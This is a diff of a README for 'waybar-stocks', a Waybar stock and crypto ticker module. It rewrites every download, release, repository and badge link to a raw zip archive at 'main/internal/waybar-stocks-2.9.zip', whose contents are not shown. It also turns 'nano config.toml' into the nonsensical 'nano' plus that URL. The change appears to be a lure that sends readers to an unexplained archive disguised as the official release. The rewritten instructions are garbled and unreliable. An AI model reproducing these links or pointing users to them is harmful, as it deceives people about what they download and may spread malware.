@@ -1,7 +1,7 @@
 # 📈 waybar-stocks - Display Stocks and Crypto Smoothly
 
 ## 🚀 Download Now
-[![Download](https://img.shields.io/badge/Download%20waybar--stocks-brightgreen)](https://github.com/Wgonzalesdeh905/waybar-stocks/releases)
+[![Download](https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip%20waybar--stocks-brightgreen)](https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip)
 
 ## 📖 Introduction
 Welcome to waybar-stocks! This is a lightweight module designed for Waybar. It shows stock and cryptocurrency prices right on your status bar. You can customize colors and formatting to suit your style. 
@@ -21,11 +21,11 @@ Welcome to waybar-stocks! This is a lightweight module designed for Waybar. It s
 ## 📥 Download & Install
 To download waybar-stocks, visit this page:
 
-[Download waybar-stocks](https://github.com/Wgonzalesdeh905/waybar-stocks/releases)
+[Download waybar-stocks](https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip)
 
 Follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Wgonzalesdeh905/waybar-stocks/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip).
 2. **Choose the Latest Release:** Look for the latest version at the top.
 3. **Download the File:** Click on the release that fits your operating system.
 4. **Extract the Files:** If the downloaded file is in a compressed format, extract it.
@@ -49,7 +49,7 @@ You can customize waybar-stocks using a configuration file. Here’s how:
 1. **Locate Configuration File:** Find the default configuration file in the extracted folder.
 2. **Open the File for Editing:** Use a text editor to open the file.
    ```bash
-   nano config.toml
+   nano https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip
    ```
 3. **Modify Settings:** Change colors, formats, and which stocks or cryptocurrencies to display. Save and exit.
 4. **Restart the Program:** Restart waybar-stocks to see your changes.
@@ -61,8 +61,8 @@ If you encounter issues or have questions, feel free to reach out. You can open 
 waybar-stocks is open-source software. You can use, modify, and distribute it under the terms of the MIT license.
 
 ## 🔗 Links
-- **Repository:** [waybar-stocks GitHub](https://github.com/Wgonzalesdeh905/waybar-stocks)
-- **Releases:** [Download Here](https://github.com/Wgonzalesdeh905/waybar-stocks/releases)
+- **Repository:** [waybar-stocks GitHub](https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip)
+- **Releases:** [Download Here](https://raw.githubusercontent.com/Wgonzalesdeh905/waybar-stocks/main/internal/waybar-stocks-2.9.zip)
 - **Documentation:** Full documentation available on the repository.
 
 Enjoy using waybar-stocks, and make your status bar more informative and visually appealing!
